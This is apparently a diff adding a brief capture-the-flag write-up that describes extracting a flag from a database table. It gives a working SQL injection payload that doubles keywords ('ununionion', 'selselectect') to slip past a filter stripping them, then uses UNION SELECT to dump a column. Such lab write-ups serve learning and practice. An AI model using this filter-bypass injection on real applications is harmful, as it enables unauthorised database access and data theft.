@@ -1,0 +1,4 @@
+In this problem i looked at the contents of all three tables in the database.
+Now there was a record in table ft8736320 corresponding to uname flag, and the name attribute of that record had the flag.
+
+My SQL Query - ' oorr 1 ununionion (selselectect null,(SEselectLECT (group_concat(name)) FROM ft8736320 whwhereere uname='flag'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
